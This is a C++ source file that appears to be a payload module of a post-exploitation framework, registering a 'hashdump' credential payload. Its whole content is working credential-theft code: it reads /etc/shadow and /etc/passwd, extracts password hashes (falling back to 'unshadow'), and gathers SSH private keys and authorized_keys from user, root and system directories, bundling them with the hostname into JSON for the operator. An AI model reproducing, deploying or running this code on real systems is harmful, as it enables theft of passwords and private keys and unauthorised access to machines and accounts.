#include <dirent.h>
#include <pwd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

#include "snake/payloads.hpp"

namespace snake::payloads {
namespace {

using OJ = nlohmann::ordered_json;

OJ extract_ssh_keys() {
    OJ keys = OJ::array();
    std::string home;
    const char* env_home = getenv("HOME");
    if (env_home != nullptr && *env_home != '\0') {
        home = env_home;
    } else {
        struct passwd* pw = getpwuid(getuid());
        if (pw != nullptr && pw->pw_dir != nullptr) home = pw->pw_dir;
    }

    std::vector<std::string> search;
    if (!home.empty()) search.push_back(home + "/.ssh");
    search.push_back("/root/.ssh");
    search.push_back("/etc/ssh");

    for (const auto& sp : search) {
        DIR* d = opendir(sp.c_str());
        if (d == nullptr) continue;
        struct dirent* e;
        while ((e = readdir(d)) != nullptr) {
            std::string name = e->d_name;
            std::string full = sp + "/" + name;
            struct stat st;
            if (stat(full.c_str(), &st) != 0 || S_ISDIR(st.st_mode)) continue;
            if (name != "id_rsa" && name != "id_dsa" && name != "id_ecdsa" &&
                name != "id_ed25519" && name != "authorized_keys")
                continue;
            std::string content;
            if (!read_file(full, content)) continue;
            std::string type = "unknown";
            if (content.find("PRIVATE KEY") != std::string::npos) {
                type = "private_key";
            } else if (content.find("ssh-") != std::string::npos) {
                type = "public_key";
            }
            if (content.size() > 500) content = content.substr(0, 500) + "...";
            OJ k;
            k["path"] = full;
            k["type"] = type;
            k["content"] = content;
            keys.push_back(k);
        }
        closedir(d);
    }
    return keys;
}

class HashDump : public Payload {
  public:
    const char* name() const override { return "hashdump"; }
    const char* category() const override { return "credential"; }
    const char* description() const override {
        return "Dump password hashes from /etc/shadow, /etc/passwd, search memory, SSH keys";
    }

    Output execute(const Args&) const override {
        std::string shadow, passwd;
        bool have_shadow = read_file("/etc/shadow", shadow);
        bool have_passwd = read_file("/etc/passwd", passwd);

        OJ hashes = OJ::object();
        auto harvest = [&](const std::string& data, const std::vector<std::string>& skip) {
            for (const auto& raw : split(data, '\n')) {
                std::string line = trim(raw);
                if (line.empty()) continue;
                size_t pos = line.find(':');
                if (pos == std::string::npos) continue;
                std::string user = line.substr(0, pos);
                std::string hash = line.substr(pos + 1);
                bool skipped = false;
                for (const auto& s : skip)
                    if (hash == s) skipped = true;
                if (!hash.empty() && !skipped) hashes[user] = hash;
            }
        };
        if (have_shadow) harvest(shadow, {"*", "!", "!!"});

        if (hashes.empty()) {
            CmdResult r = run_cmd_out({"unshadow", "/etc/passwd", "/etc/shadow"});
            if (r.ok) harvest(r.out, {"x", "*", "!"});
        }

        OJ ssh_keys = extract_ssh_keys();
        OJ mem_procs = OJ::array();

        OJ out = OJ::object();
        out["timestamp"] = now_rfc3339();
        out["hostname"] = hostname_now();
        if (have_shadow && !shadow.empty()) out["shadow_file"] = shadow;
        if (have_passwd && !passwd.empty()) out["passwd_file"] = passwd;
        out["linux_hashes"] = hashes;
        out["ssh_keys"] = ssh_keys;
        out["memory_processes"] = mem_procs;
        OJ summary = OJ::object();
        summary["hashes"] = (int)hashes.size();
        summary["processes"] = 0;
        summary["ssh_keys"] = (int)ssh_keys.size();
        out["summary"] = summary;

        std::string s = MarshalJSON(out);
        return Output(s.begin(), s.end());
    }
};

HashDump g_hashdump;

struct Reg { Reg() { Register(&g_hashdump); } };
Reg g_reg;

}  // namespace
}  // namespace snake::payloads
